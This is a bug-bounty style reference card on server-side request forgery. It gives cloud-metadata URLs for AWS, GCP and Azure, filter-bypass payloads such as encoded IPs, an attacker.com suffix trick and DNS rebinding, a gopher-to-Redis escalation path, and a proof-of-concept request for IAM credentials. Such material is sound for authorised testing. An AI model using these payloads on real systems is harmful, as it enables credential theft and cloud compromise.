# SSRF — Bug Knowledge Card
Classe / sous-classe: Server-Side Request Forgery (incl. blind SSRF, cloud-metadata pivot)

Severity ceiling (CVSS): up to 10.0 — SSRF → cloud metadata → IAM credentials → full cloud
tenant compromise. Internal-port scan / blind SSRF alone 5–7; metadata read 9+.

🔭 SPOT TESTS
- Any feature that fetches a URL: webhooks, "import from URL", PDF/image from URL, link
  preview, avatar-by-URL, SSO metadata URL, file upload by URL, XML/SVG parsers, proxies.
- Params like `url=`, `uri=`, `dest=`, `callback=`, `webhook=`, `image=`, `feed=`, `host=`.
- Any server that renders HTML/PDF from user input (SVG/`<iframe>`/`<img>` can SSRF).

🧨 EXPLOIT TESTS
1. Point the fetch at a Collaborator/interactsh host → confirm OOB DNS+HTTP callback = SSRF.
2. Hit cloud metadata:
   - AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
     (IMDSv2 needs a PUT token first — try both).
   - GCP: `http://metadata.google.internal/computeMetadata/v1/` (`Metadata-Flavor: Google`).
   - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (`Metadata:true`).
3. Internal scan: `http://127.0.0.1:PORT`, `http://localhost`, internal hostnames.
4. Blind SSRF → use timing / OOB only; escalate via gopher/redis/smtp if raw sockets reach.

🧗 BYPASS TABLE (defeat IP/host filters)
- Decimal/octal/hex IP: `2130706433`, `017700000001`, `0x7f000001` for 127.0.0.1.
- IPv6 / mapped: `[::1]`, `[::ffff:169.254.169.254]`, `[0:0:0:0:0:ffff:a9fe:a9fe]`.
- DNS rebinding: a host whose TTL flips public→internal between check and fetch.
- Redirect: your server 302s to `169.254.169.254` (filter only checks the first URL).
- Enclosed-alphanumerics / unicode-dot: `①②⑦.0.0.1`, `127。0。0。1`.
- `@` trick: `http://expected.com@169.254.169.254/`, or `#`, or credentials form.
- Suffix/subdomain: `metadata.google.internal.attacker.com`, `169.254.169.254.nip.io`.

🔗 CHAIN MAP
- SSRF → **cloud metadata** → IAM/STS creds → **cloud-pentest** (assume-role, S3, admin).
- SSRF → internal admin panel / actuator → config dump → secrets → **RCE**.
- SSRF → Redis/Memcached via gopher → **RCE**.
- SSRF reaching an SSO/OIDC discovery URL → auth bypass pivot.

🧪 POC SKELETON
```
POST /api/import {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE"}
→ response contains AccessKeyId/SecretAccessKey/Token  == critical SSRF→creds
```
For blind: show the interactsh DNS+HTTP hit correlated to your request ID.

📚 REFS: PortSwigger SSRF; Orange Tsai SSRF talks; AWS IMDSv2 docs; cloud-metadata CVEs.
